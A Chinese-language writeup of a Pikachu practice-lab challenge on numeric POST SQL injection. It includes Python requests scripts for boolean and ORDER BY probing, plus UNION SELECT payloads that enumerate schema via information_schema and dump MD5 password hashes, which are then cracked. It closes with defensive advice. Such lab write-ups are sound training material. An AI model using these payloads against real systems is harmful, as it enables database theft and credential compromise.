【Pikachu】Web-SQL-Inject 数字型注入(post) Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, 数字型注入, POST注入, Python, requests

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称：数字型注入(post)
  • 目标：利用POST请求中的数字型SQL注入漏洞，获取数据库中的管理员账号和密码。

2. 解题思路与知识点

漏洞原理：

数字型SQL注入是指后端程序没有对用户输入的参数进行严格的过滤和类型检查，并将其直接拼接到SQL语句中。由于参数是数字型，后端SQL语句通常类似于 SELECT * FROM users WHERE id = $id（没有单引号包裹）。攻击者可以通过构造特定的SQL语句（如逻辑判断、联合查询等），欺骗数据库执行非预期的查询操作，从而窃取敏感信息。

工具选型与心路历程：
  • F12抓包分析：由于是POST请求，参数在URL中不可见。使用F12的Network面板抓取POST请求，明确参数名为 id。
  • Python requests 脚本：在测试过程中发现F12的“编辑并重发”功能不便于操作，且需要反复调整payload。因此使用Python的 requests 库编写脚本，通过POST方式发送自动化测试payload，极大地提升了注入效率。
  • union select 联合查询：利用 UNION SELECT 将恶意查询结果合并到前端页面显示，结合 information_schema 元数据库，实现从库名、表名、列名到最终账号密码的逐层窃取。
  • MD5解密：获取到的是MD5哈希值，通过cmd5.com在线解密，还原明文密码。

3. 操作步骤

第一步：抓包与参数分析

操作：在页面下拉框选择 1，点击“查询”。按 F12 打开开发者工具，切换到 网络 (Network) 标签页，勾选 保留日志，清空记录后再次点击查询。

抓包结果：在列表中点击 sqli_id.php 请求，查看右侧的 载荷 (Payload)。确认请求方式为POST，参数名为 id，值为 1，另有 submit: 查询。

第二步：探测漏洞是否存在（布尔测试）

操作： 编写 Python 脚本发送 POST 请求，分别测试 id=1 and 1=1 和 id=1 and 1=2。

代码内容：

import requests

url = "http://127.0.0.1/pikachu/vul/sqli/sqli_id.php"

payload_true = {"id": "1 and 1=1", "submit": "查询"}
r_true = requests.post(url, data=payload_true)
if "vince" in r_true.text:
    print("[+] 1=1 查询成功，页面包含 vince")
else:
    print("[-] 1=1 查询无结果")

payload_false = {"id": "1 and 1=2", "submit": "查询"}
r_false = requests.post(url, data=payload_false)
if "vince" in r_false.text:
    print("[!] 1=2 也查询到了 vince，可能没有注入漏洞")
else:
    print("[+] 1=2 查询无结果，漏洞存在！")

回显结果：脚本打印出 [+] 1=1 查询成功 和 [+] 1=2 查询无结果，漏洞存在！，证明SQL注入漏洞可利用。

第三步：探测字段数（ORDER BY）

操作：使用 ORDER BY 语句循环探测当前查询的列数。

import requests

url = "http://127.0.0.1/pikachu/vul/sqli/sqli_id.php"
print("[*] 开始探测字段数...")
for i in range(1, 11):
    payload = {"id": f"1 order by {i}", "submit": "查询"}
    r = requests.post(url, data=payload)
    if "vince" in r.text:
        print(f"[+] ORDER BY {i} 成功（页面正常）")
    else:
        print(f"[-] ORDER BY {i} 失败（页面报错），推断字段数为 {i-1}")
        break

回显结果：输出 ORDER BY 2 成功，ORDER BY 3 失败，推断字段数为 2。说明后端SQL语句查询了2个字段。

第四步：联合查询获取数据（UNION SELECT）

操作：利用 id=0 使原查询失效，使用 UNION SELECT 逐步获取库名、表名、列名和账号密码。

1. 查库名：

Payload： 0 union select 1,database()

结果： 库名为 pikachu。

2. 查表名：

Payload： 0 union select 1, group_concat(table_name) from information_schema.tables where table_schema='pikachu'

结果： 表名有 httpinfo, member, message, users, xssblind。锁定目标表为 member。

3. 查列名：

Payload： 0 union select 1, group_concat(column_name) from information_schema.columns where table_name='member' and table_schema='pikachu'

结果： 列名有 id, username, pw, sex, phonenum, address, email。确认账号和密码字段为 username 和 pw。

4. 爆账号密码：

Payload： 0 union select 1, group_concat(concat(username, ':', pw)) from member

结果： 获取到一组账号和对应的MD5密码哈希值，例如 vince:e10adc3949ba59abbe56e057f20f883e。

第五步：解密与验证

操作： 将获取到的哈希值 e10adc3949ba59abbe56e057f20f883e 放入 cmd5.com 进行查询。

结果： 解密结果为明文密码 123456。说明靶场未对密码进行加盐处理，且使用了弱口令。

4. 踩坑记录与复盘

  • 坑1：F12 无法直接修改 POST 参数。与 GET 请求不同，POST 请求的参数在 URL 中不可见。在浏览器 F12 中，部分版本没有直观的“编辑并重发”功能。解决方案是使用 Python requests.post() 脚本直接发送修改后的数据。
  • 坑2：密码哈希无法直接利用。直接提取到的密码是 MD5 哈希值，无法直接用于登录。需要通过在线工具解密或使用 Python 的 hashlib 库对比常见弱口令字典进行解密。

5. 知识总结

  • 数字型注入核心：后端未对参数进行严格类型校验，导致SQL语句可被拼接。判断依据是 and 1=1 页面正常，and 1=2 页面异常。
  • UNION 联合查询：在确定字段数后，利用 UNION SELECT 结合 information_schema 数据库，逐步获取库名、表名、列名，实现完整的“脱库”攻击。
  • 防御建议：针对SQL注入，应使用预编译语句（Prepared Statements）或参数化查询，严格分离代码与数据；同时应对用户密码进行强哈希加盐处理（如bcrypt），以增加破解难度。
